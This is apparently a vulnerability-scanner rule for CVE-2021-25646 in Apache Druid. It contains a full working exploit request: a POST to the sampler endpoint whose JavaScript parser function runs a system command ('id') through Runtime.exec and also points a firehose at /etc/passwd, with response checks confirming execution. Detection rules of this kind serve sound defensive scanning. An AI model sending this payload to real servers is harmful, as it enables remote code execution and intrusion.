cve-id: CVE-2021-25646
# manual: true
transport: http
rules:
  - method: POST
    path: /druid/indexer/v1/sampler
    headers:
      Content-Type: application/json
    body: |
      {"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"/etc","filter":"passwd"}},"dataSchema":
      {"dataSource":"test","parser":{"parseSpec":{"format":"javascript","timestampSpec":{},"dimensionsSpec":{},
      "function":"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\"id\"]).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:123123,test: a}}",
      "":{"enabled":"true"}}}}},"samplerConfig":{"numRows":10}}
    expression: response.status == 200 && response.body.bcontains(b"uid=") && response.body.bcontains(b"gid=") && response.body.bcontains(b"groups=")
severity:
  critical
type: 
  rce